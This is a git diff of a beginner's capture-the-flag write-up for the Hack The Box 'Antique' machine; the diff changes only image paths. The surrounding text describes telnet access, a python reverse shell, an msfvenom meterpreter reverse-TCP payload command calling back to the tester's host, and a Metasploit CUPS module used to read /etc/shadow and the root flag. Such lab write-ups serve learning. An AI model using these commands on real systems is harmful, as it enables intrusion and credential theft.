@@ -8,7 +8,7 @@ I am a beginner at penetration testing, so I will be referencing the Official Ha
 
 From the tags, I am able to notice that this machine is about printer exploitation on Linux:
 
-![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 A basic nmap scan shows that only telnet is online:
 
@@ -86,7 +86,7 @@ The password seems to be: **P@ssw0rd@123!!123** I was in!
 
 I then noticed the walk-through mentioned to run `exec id`. I then tried playing around with linux commands, and ended up finding the user.txt file:
 
-![](<../../.gitbook/assets/image (325).png>)
+![](<../../.gitbook/assets/image (325) (1).png>)
 
 I noticed the write-up use python for the reverse shell. I then used [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to see if I can use one of their python commands. Once I changed their python command from **python** to **python3**, it worked:
 
@@ -104,11 +104,11 @@ They then go on to say that we should use **chisel** to connect to the port. I r
 
 &#x20;I then followed [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/) to see what I missed and what I could have done instead. They run `wget localhost:631`, which makes a file called **index.html** in the folder you are in. There, you can see that CUPS is mentioned:
 
-![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 When we search for cups on metasploit we get the following:
 
-![](<../../.gitbook/assets/image (338) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (338) (1) (1) (1) (1) (1) (1) (1).png>)
 
 We first make a shell file to upload to the server. To do this, the walk-through mentioned previously mentions `msfvenom -p linux/x64/meterpreter/reverse`_`tcp LHOST=<`_`YOUR-IP> LPORT=1337 --format elf > shell`. This will make the **shell** file in your directory. To move it to the remote machine, you can use the python http.server command mentioned previously. Before I ran the shell executable, I ran the following commands in Metasploit (based off of [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/)):
 
@@ -122,7 +122,7 @@ run
 
 After I ran the **run** command, I then switched to the remote machine and ran the shell executable (run `chmod +x shell` to make it executable). This gave me a connection in Metasploit:
 
-![](<../../.gitbook/assets/image (347) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (347) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 I then ran the following commands to look for the cups post exploitation program:
 
@@ -134,7 +134,7 @@ I then hit run and got an output:
 
 Opening that file shows the output of /etc/shadow:
 
-![](<../../.gitbook/assets/image (342) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (342) (1) (1) (1) (1) (1) (1).png>)
 
 Since we want to get the output of /root/root.txt, I changed my option in metasploit to that:
 
@@ -142,4 +142,4 @@ Since we want to get the output of /root/root.txt, I changed my option in metasp
 
 Reading that file got me the root flag:
 
-![](<../../.gitbook/assets/image (340) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../../.gitbook/assets/image (340) (1) (1) (1) (1) (1) (1) (1) (1).png>)
